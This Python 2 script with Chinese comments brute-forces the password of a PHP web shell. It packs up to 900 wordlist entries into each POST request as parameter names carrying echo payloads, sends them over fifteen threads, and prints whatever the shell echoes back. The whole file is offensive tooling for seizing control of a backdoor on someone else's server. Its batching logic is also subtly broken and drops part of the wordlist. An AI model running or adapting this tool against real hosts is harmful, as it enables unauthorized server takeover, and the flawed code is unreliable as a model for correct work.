# coding:utf-8
# __author__ : learn
 
import threading,Queue,requests
 
class Add_password:
 
    def __init__(self,dictname,queue):
        self.dictname = dictname
        self.queue = queue
 
    # 加载字典 以\n分割 保存到list
    def load_file(self):
        with open(self.dictname,'r') as f:
            lines = f.readlines()
 
        return map(lambda x:x.split('\n')[0],lines)
 
    #========================
    '''分割数量大于 900 密码数量的字典算法
    因为apache 最多传入1000个参数。 如果 密码数量大于900 就分割字典 
 
    '''
    def split_file(self):
        file_read = self.load_file()
        file_list = []
        if len(file_read) < 900:
            file_list.append(file_read)
        elif len(file_read)%900 !=0 and len(file_read)/900 >= 1:
            split_num = len(file_read)
 
            for num in range(split_num/900-1):
                file_list.append(file_read[num*900:num*900+900])
            file_list.append(file_read[split_num/900*900:])
        return file_list
 
    # 主要的部分  用来生成payload 加入队列 
    # 待post参数的格式为 {"pass":"echo 'pass';","pass2":"echo 'pass2';",...}
    def main(self):
        php_passwords = self.split_file()
        for q in php_passwords:
            payloads = [x for x in q]
            payload = map(lambda x:{x:"echo '%s';"%x},payloads)
            payload = reduce(lambda x,y:dict(x,**y),payload)
            self.queue.put(payload)
        return
 
     
class Main(threading.Thread):
 
    def __init__(self,url,queue):
        threading.Thread.__init__(self)
        self.url = url
        self.queue = queue
        self.payloads = {}
 
         
    def run(self):
        while True:
            if self.queue.empty():
                break
            data = self.queue.get_nowait()
            req = requests.post(self.url,data=data)
 
            #这里我判断的是 post之后的页面有没有echo的值 导致脚本局限性很大。
            if req.content != '':
                print 'Password Found: '+req.content
                exit(0)
 
 
if __name__ == '__main__':
    import sys
 
    threads = []
    q = Queue.Queue(maxsize=0)
 
    args = sys.argv
    if len(args)<3 or args[1][:4]!='http' or args[2][-3:] != 'txt':
        print 'usage: python %s [url]http://www.xxx.com/shell[/url],php password.txt'%args[0]
        sys.exit(0)
 
    Add_password(args[2],q).main()
    for i in range(15):#这里可以适当的修改，速度会提高
        threads.append(Main(args[1],q))
 
    for t in threads:
        t.start()
 
    for j in threads:
        j.join()
